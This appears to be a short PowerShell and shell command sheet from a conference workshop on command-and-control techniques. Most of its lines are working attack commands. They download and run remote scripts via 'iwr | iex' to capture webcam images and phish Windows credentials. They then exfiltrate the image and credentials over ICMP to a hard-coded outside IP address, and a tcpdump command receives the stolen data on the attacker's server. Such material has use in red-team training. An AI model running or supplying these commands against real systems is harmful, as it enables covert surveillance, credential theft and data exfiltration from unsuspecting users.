
# Save webcam image
# https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
iwr https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1 | iex


# ICMP exfiltration
cat .\opencv.png | % { Invoke-ICMPExfil -Target 51.38.185.232 -Payload $_ -Verbose }

# ICMP credential phish
# https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1
iwr https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1 | iex
Invoke-CredentialsPhish | % { Invoke-ICMPExfil -Target 51.38.185.232 -Payload $_ -Verbose }

# ICMP SERVER
tcpdump -i ens3 'icmp and icmp[icmptype]=icmp-echo' -lA -s 0 | grep '89-64-40-243' -A 15 | grep -v 'IP' | grep -v 'end' | grep -v 'begin' | cut -c 29-

iwr https://raw.githubusercontent.com/aptmasterclass/powershell-kungfu/master/exfil/Invoke-ICMPExfil.ps1 | iex


# DNS
# See TXT record
nslookup -type=TXT google.com

# Resources

# https://aptmasterclass.com/bsides19/BSides19-C2-sources.html
# Reload env
$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")

